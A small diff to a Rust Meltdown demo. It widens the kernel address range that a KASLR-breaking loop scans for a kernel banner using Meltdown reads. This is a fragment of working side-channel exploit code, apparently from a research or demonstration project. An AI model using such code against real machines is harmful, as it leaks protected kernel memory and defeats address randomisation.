@@ -55,11 +55,11 @@ fn meltdown_demo() {
 
 fn meltdown_kaslr_demo() {
     let start_range = 0xffff_ffff_8100_0000u64;
-    let end_range = 0xffff_ffff_8200_0000u64;
+    let end_range = 0xffff_ffff_c100_0000u64;
     let banner_offset = 0xc00180u64;
 
     let meltdown_attack = MeltdownUS::new();
-    for addr in (start_range + banner_offset..end_range + banner_offset).step_by(0x200_000) {
+    for addr in (start_range + banner_offset..end_range + banner_offset).step_by(0x200000) {
         let addr = addr as *const u8;
         let potential_banner = (0..5)
             .map(|i| meltdown_attack.read(unsafe { addr.add(i) }))
